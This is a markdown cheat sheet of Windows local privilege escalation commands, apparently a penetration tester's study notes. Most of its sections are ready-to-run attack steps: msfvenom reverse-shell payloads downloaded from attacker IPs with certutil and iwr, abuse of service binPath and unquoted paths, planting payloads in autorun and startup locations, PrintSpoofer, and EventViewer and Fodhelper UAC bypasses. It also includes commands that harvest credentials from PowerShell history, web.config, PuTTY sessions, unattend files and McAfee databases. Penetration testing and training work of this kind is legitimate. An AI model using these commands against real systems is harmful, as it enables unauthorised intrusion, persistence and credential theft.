# Windows Enumeration and Local Privilege Escalation 
## Enumeration
-> Enumerates all local accounts
```powershell
net user
```

-> Get information from a specific user
```powershell
net user <user>
```

-> Check user privileges
```powershell
whoami /priv
```

-> View groups you belong to
```powershell
whoami /groups
```

-> View interfaces and network information  
```powershell
ipconfig /all
```

-> View all active TCP connections and the TCP and UDP ports the host is listening on
```powershell
netstat -ant
```

-> Firewall
```powershell
netsh firewall show state
netsh firewall show config
```

-> List running processes
```powershell
tasklist
```

-> View system tasks
```powershell
schtasks
```

---
## Privilege Escalation

### Unquoted Service Path
-> Detection 
```powershell
wmic service get Name,State,PathName | findstr "Program"  
sc qc <service_name>  
\\ BINARY_PATH_NAME display Unquoted Service Paths, without ""
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

-> Exploitation - attacker
```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > name <name_inside_the_path>.exe  
nc -nvlp <port>
```

-> Exploitation - windows
```powershell
iwr -uri <ip>/<service_eecutable_name> -Outfile <service_executable_name>
move <name_inside_the_path>.exe <service_path>  
```
```powershell
sc stop <service_name>
sc start <service_name>
```
or  
```powershell
shutdown /r
```

### binPath - Services [PrivEsc]
-> Detection
```powershell
. .\PowerUp.ps1
Get-ModifiableService -Verbose
```
or
```powershell
Get-ModifiableService -Verbose
wmic service get Name,State,PathName | findstr "Running" | findstr "Program"  
wmic service get Name,State,PathName | findstr "Program"  
icacls <pathname>  
//(F) and (i) (F)
accesschk.exe -wuvc <service_name>
//RW Everyone  
//  SERVICE_CHANGE_CONFIG
sc qc <service_name>
```

-> Exploitation - Windows [PrivEsc]
```powershell
certutil -urlcache -f http://10.9.1.137:803/ok.exe ok.exe  
sc config <name_ service> binPath="C:\Users\files\ok.exe" obj= LocalSystem  
sc stop <service_name>  
sc query <service_name>  
sc start <service_name>  
```

https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite  

### SeImpersonatePrivilege
```powershell
PrintSpoofer64.exe -i -c cmd
```
https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

### Autorun
-> Detection - windows
```powershell
C:\Users\<user>\Desktop\Tools\Accesschk\accesschk64.exe -wvu ""C:\Program Files\Autorun Program"  
\\FILE_ALL_ACCESS
```
-> Exploitation - kali
```powershell
msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o program.exe
```
```powershell
iex (iwr http://<file_server_IP>/PowerView.ps1 -Outfile program.exe)
move program.exe "C:\Program Files\Autorun Program"
logoff
```

### Startup Applications
-> Detection - Windows
```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | findstr (F) 
\\BUILTIN\Users:(F)
```

-> msfvenom - Attacker VM
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o ok.exe
```

-> Exploitation - Windows
```powershell
iex (iwr http://<file_server_IP>/PowerView.ps1 -Outfile ok.exe)
move ok.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”
logoff
```

### Bypass UAC
After obtaining a reverse shell on a machine with a local administrator user, it may be necessary to bypass User Account Control (UAC) to perform specific malicious actions, such as persistently installing malware, modifying security settings, or exploiting system vulnerabilities. This can be done through specialized techniques and tools designed to bypass the restrictions imposed by UAC.
https://decoder.cloud/2017/02/03/bypassing-uac-from-a-remote-powershell-and-escalting-to-system/
#### EventViewer
-> Step 1 - Kali
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f exe > ok.exe
```

-> Step 2 - Win Owned  
```powershell
cd C:\Windows\tasks
iwr -uri 192.168.119.139:805/shell.exe -Outfile shell.exe
Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
```

-> Step 3 - Win Owned  
```powershell
iwr -uri 192.168.119.139:805/powerup.ps1 -Outfile powerup.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```
`[+] Run a BypassUAC attack to elevate privileges to admin.`

-> Step 4 -Kali
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.139 LPORT=8445 -f exe > ok.exe
```

-> Step 5 - Win Owned
```powershell
wget 192.168.119.139:805/Invoke-EventViewer.ps1 -O Invoke-EventViewer.ps1
. .\Invoke-EventViewer.ps1
Invoke-EventViewer cmd.exe /c "C:\Windows\tasks\shell2.exe"
Invoke-EventViewer C:\Windows\tasks\shell2.exe
```
https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1

#### FodhelperBypass
https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1

### Capturing configuration file credentials
-> Powershell History  
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

-> EXploiting Saved Windows Credentials
```powershell
cmdkey /list  
runas /savecred /user:admin cmd.exe
```

-> IIS Configuration  
```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString  
type C:\inetpub\wwwroot\web.config | findstr connectionString
```
  
-> Retrieve Credentials from Software: PuTTY  
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

-> Unattended Windows Installations
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
  
-> Identify  
```cmd
dir /s *.db
```
-> McAfee Enterprise Endpoint Security - Credentials used during installation  

```powershell
C:\ProgramData\McAfee\Agent\DB\ma.db
sqlitebrowser ma.db
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```
https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py

## Windows Enumeration Tools
-> PowerUp.ps1  
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1  

-> winPEASany.exe
```powershell
winPEASany.exe
```
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  

-> windows-privesc-check2.exe  
```powershell
windows-privesc-check2.exe --dump -G
```
https://github.com/pentestmonkey/windows-privesc-check
